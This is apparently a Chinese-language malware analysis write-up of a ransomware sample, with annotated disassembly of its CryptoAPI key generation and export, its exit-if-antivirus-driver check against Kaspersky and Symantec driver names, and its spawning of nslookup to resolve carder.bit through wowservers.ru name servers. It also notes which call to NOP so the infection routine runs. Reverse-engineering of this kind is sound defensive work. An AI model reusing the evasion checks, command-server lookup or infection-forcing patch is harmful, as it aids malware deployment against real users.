
# 汇编代码片段

```
01A26F83    E9 84000000     jmp     01A2700C

01A26F88    8D55 F8         lea     edx, dword ptr [ebp-8]

01A26F8B    52              push    edx

01A26F8C    68 01000008     push    8000001

01A26F91    68 00A40000     push    0A400

01A26F96    8B45 FC         mov     eax, dword ptr [ebp-4]

01A26F99    50              push    eax

01A26F9A    FF15 34B0A201   call    dword ptr [1A2B034]              ; advapi32.CryptGenKey

01A26FA0    85C0            test    eax, eax

01A26FA2    75 01           jnz     short 01A26FA5

01A26FA4    90              nop

01A26FA5    C745 F4 0000000>mov     dword ptr [ebp-C], 0

01A26FAC    8B4D 0C         mov     ecx, dword ptr [ebp+C]

01A26FAF    51              push    ecx

01A26FB0    8B55 08         mov     edx, dword ptr [ebp+8]

01A26FB3    52              push    edx

01A26FB4    6A 00           push    0

01A26FB6    6A 06           push    6

01A26FB8    6A 00           push    0

01A26FBA    8B45 F8         mov     eax, dword ptr [ebp-8]

01A26FBD    50              push    eax

01A26FBE    FF15 1CB0A201   call    dword ptr [1A2B01C]              ; advapi32.CryptExportKey

01A26FC4    8B4D 14         mov     ecx, dword ptr [ebp+14]

01A26FC7    51              push    ecx

01A26FC8    8B55 10         mov     edx, dword ptr [ebp+10]

01A26FCB    52              push    edx

01A26FCC    6A 00           push    0

01A26FCE    6A 07           push    7

01A26FD0    6A 00           push    0

01A26FD2    8B45 F8         mov     eax, dword ptr [ebp-8]

01A26FD5    50              push    eax

01A26FD6    FF15 1CB0A201   call    dword ptr [1A2B01C]              ; advapi32.CryptExportKey

01A26FDC    8B4D F8         mov     ecx, dword ptr [ebp-8]

01A26FDF    51              push    ecx

01A26FE0    FF15 38B0A201   call    dword ptr [1A2B038]              ; advapi32.CryptDestroyKey

01A26FE6    6A 00           push    0

01A26FE8    8B55 FC         mov     edx, dword ptr [ebp-4]

01A26FEB    52              push    edx

01A26FEC    FF15 28B0A201   call    dword ptr [1A2B028]              ; advapi32.CryptReleaseContext

01A26FF2    6A 10           push    10

01A26FF4    6A 01           push    1

01A26FF6    68 D80DA301     push    1A30DD8                          ; UNICODE "Microsoft Enhanced Cryptographic Provider v1.0"

01A26FFB    6A 00           push    0

01A26FFD    8D45 FC         lea     eax, dword ptr [ebp-4]

01A27000    50              push    eax

01A27001    FF15 20B0A201   call    dword ptr [1A2B020]              ; advapi32.CryptAcquireContextW

01A27007    B8 01000000     mov     eax, 1
```

## 驱动检查

查找驱动程序 `klif.sys`、`kl1.sys`、`fsdfw.sys`、`srtsp.sys`、`srtsp64.sys`、`NavEx15.sys`、`NavEng.sys`，如果存在则退出（一些杀软常见的驱动）

```
01AB2DF6    8D4C24 1C   lea     ecx, dword ptr [esp+1C]

01AB2DFA    C74424 20 6>mov     dword ptr [esp+20], 660069

01AB2E02    C74424 24 2>mov     dword ptr [esp+24], 73002E

01AB2E0A    C74424 28 7>mov     dword ptr [esp+28], 730079

01AB2E12    66:894424 2>mov     word ptr [esp+2C], ax

01AB2E17    C74424 0C 6>mov     dword ptr [esp+C], 6C006B

01AB2E1F    C74424 10 3>mov     dword ptr [esp+10], 2E0031

01AB2E27    C74424 14 7>mov     dword ptr [esp+14], 790073

01AB2E2F    C74424 18 7>mov     dword ptr [esp+18], 73           ; klif.sys

01AB2E37    E8 C4010000 call    01AB3000

01AB2E3C    85C0        test    eax, eax

01AB2E3E    75 59       jnz     short 01AB2E99

01AB2E40    8D4C24 0C   lea     ecx, dword ptr [esp+C]           ; kl1.sys

01AB2E44    E8 B7010000 call    01AB3000

01AB2E49    85C0        test    eax, eax

01AB2E4B    75 4C       jnz     short 01AB2E99

01AB2E4D    8D4C24 1C   lea     ecx, dword ptr [esp+1C]

01AB2E51    C74424 1C 6>mov     dword ptr [esp+1C], 730066

01AB2E59    C74424 20 6>mov     dword ptr [esp+20], 660064

01AB2E61    C74424 24 7>mov     dword ptr [esp+24], 2E0077

01AB2E69    C74424 28 7>mov     dword ptr [esp+28], 790073

01AB2E71    C74424 2C 7>mov     dword ptr [esp+2C], 73           ; fsdfw.sys

01AB2E79    E8 82010000 call    01AB3000
...
01AB31E3    C745 DC 6E0>mov     dword ptr [ebp-24], 67006E

01AB31EA    C745 E0 2E0>mov     dword ptr [ebp-20], 73002E

01AB31F1    C745 E4 790>mov     dword ptr [ebp-1C], 730079

01AB31F8    66:8945 E8  mov     word ptr [ebp-18], ax            ; srtsp.sys

01AB31FC    E8 FFFDFFFF call    01AB3000
...
01AB3208    8D4D BC     lea     ecx, dword ptr [ebp-44]          ; srtsp64.sys

01AB320B    E8 F0FDFFFF call    01AB3000

01AB3210    85C0        test    eax, eax

01AB3212    75 1C       jnz     short 01AB3230

01AB3214    8D4D A4     lea     ecx, dword ptr [ebp-5C]          ; NavEx15.sys

01AB3217    E8 E4FDFFFF call    01AB3000

01AB321C    85C0        test    eax, eax

01AB321E    75 10       jnz     short 01AB3230

01AB3220    8D4D D4     lea     ecx, dword ptr [ebp-2C]          ; NavEng.sys

01AB3223    E8 D8FDFFFF call    01AB3000
```

## 进程创建与网络查询

创建进程 `nslookup.exe`，查询 `carder.bit`, `ns2.wowservers.ru` `carder.bit` , `ns1.wowservers.ru` 服务器地址, 但是服务器挂了，所以未查询成功

```
01AB5D31    68 E8030000     push    3E8

01AB5D36    FF15 A0B0AB01   call    dword ptr [1ABB0A0]              ; kernel32.Sleep

01AB5D3C    6A 04           push    4

01AB5D3E    68 00300000     push    3000

01AB5D43    53              push    ebx

01AB5D44    FF15 40B1AB01   call    dword ptr [1ABB140]              ; kernel32.lstrlenW

01AB5D4A    8D0445 02000000 lea     eax, dword ptr [eax*2+2]

01AB5D51    50              push    eax

01AB5D52    6A 00           push    0

01AB5D54    FF15 70B1AB01   call    dword ptr [1ABB170]              ; kernel32.VirtualAlloc

01AB5D5A    8B55 F8         mov     edx, dword ptr [ebp-8]

01AB5D5D    8BD8            mov     ebx, eax

01AB5D5F    56              push    esi

01AB5D60    8BCB            mov     ecx, ebx

01AB5D62    E8 59FDFFFF     call    01AB5AC0

01AB5D67    83C4 04         add     esp, 4

01AB5D6A    68 C40BAC01     push    1AC0BC4                          ; ASCII "fabian wosar <3"

01AB5D6F    53              push    ebx

01AB5D70    FF15 ACB1AB01   call    dword ptr [1ABB1AC]              ; kernel32.lstrcmpiA

01AB5D76    85C0            test    eax, eax

01AB5D78    75 15           jnz     short 01AB5D8F

01AB5D7A    68 00800000     push    8000

01AB5D7F    50              push    eax

01AB5D80    53              push    ebx

01AB5D81    FF15 B0B1AB01   call    dword ptr [1ABB1B0]              ; kernel32.VirtualFree

01AB5D87    8B5D FC         mov     ebx, dword ptr [ebp-4]

01AB5D8A    83C9 FF         or      ecx, FFFFFFFF

01AB5D8D  ^ EB 87           jmp     short 01AB5D16
...
01AB58B4    50              push    eax

01AB58B5    8D45 A8         lea     eax, dword ptr [ebp-58]

01AB58B8    C745 A8 4400000>mov     dword ptr [ebp-58], 44

01AB58BF    50              push    eax

01AB58C0    6A 00           push    0

01AB58C2    6A 00           push    0

01AB58C4    6A 00           push    0

01AB58C6    6A 01           push    1

01AB58C8    6A 00           push    0

01AB58CA    6A 00           push    0

01AB58CC    56              push    esi                              ; nslookup carder.bit ns2.wowservers.ru

01AB58CD    6A 00           push    0

01AB58CF    FF15 BCB0AB01   call    dword ptr [1ABB0BC]              ; kernel32.CreateProcessW
```

## 感染流程修改

修改代码让样本能执行感染文件部分

```
01A25C4A    53              push    ebx

01A25C4B    FF75 08         push    dword ptr [ebp+8]

01A25C4E    56              push    esi

01A25C4F    FF15 50B2A201   call    dword ptr [1A2B250]              ; user32.wsprintfW

01A25C55    83C4 0C         add     esp, 0C

01A25C58    8BCE            mov     ecx, esi

01A25C5A    E8 11FCFFFF     call    01A25870

01A25C5F    8BD3            mov     edx, ebx

01A25C61    8BCF            mov     ecx, edi

01A25C63    E8 A8FDFFFF     call    01A25A10                         ; 这个call会阻塞，nop掉
...
01A255FF    E8 1CFEFFFF     call    01A25420

01A25604    85C0            test    eax, eax

01A25606    74 08           je      short 01A25610

01A25608    6A 00           push    0
```
